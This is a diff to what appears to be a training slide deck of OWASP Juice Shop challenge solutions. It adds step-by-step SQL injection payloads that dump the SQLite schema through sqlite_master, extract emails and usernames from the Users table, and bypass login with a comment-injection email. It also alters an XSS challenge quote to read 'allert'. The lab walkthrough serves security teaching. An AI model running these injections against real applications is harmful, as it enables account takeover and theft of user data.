@@ -158,14 +158,24 @@ Proposed solution to challenges
 
 <code style="font-size: 0.5em;">
 
-1. 
+1. From previous challenges (A03 or A01 login) - try SQL inject search API to provoke an error
+2. Inspect the network response - the error message. Notice the SQL database (SQLITE)
+3. With information above, we can see what "db schema sqlite" - www.sqlite.org/index.html - FAQ nr7 https://www.sqlite.org/faq.html#q7
+4. From the knowledge of SQLITE_SCHEMA we can produce : blabla'))UNION%20select%20sql,2,3,4,5,6,7,8,9%20from%20sqlite_master--
+5. Try this in the search API (A03): /rest/products/search?q=blabla'))UNION%20select%20sql,2,3,4,5,6,7,8,9%20from%20sqlite_master--
+6. Inspect the response - Notice the table "Users"
+7. Notice the column "DeletedAt" in talbe "Users"
+8. Get the deltedAt, email and username
+9. /rest/products/search?q=blabla'))UNION%20select%20deletedAt,email,username,4,5,6,7,8,9%20from%20users--
+10. Inspect chris.pike's info - he seem to be deleted
+11. Login with Chris'es e-mail with knowledge from previous injection info - chris.pike@juice-sh.op'--;
 
 </code>
 
 ---
 ## A10:Server-side XSS Protection
 
-> Perform a persisted XSS attack with <iframe src="javascript:alert('xss')"> bypassing a server-side 
+> Perform a persisted XSS attack with <iframe src="javascript:allert('xss')"> bypassing a server-side 
 
 <code style="font-size: 0.5em;">
 
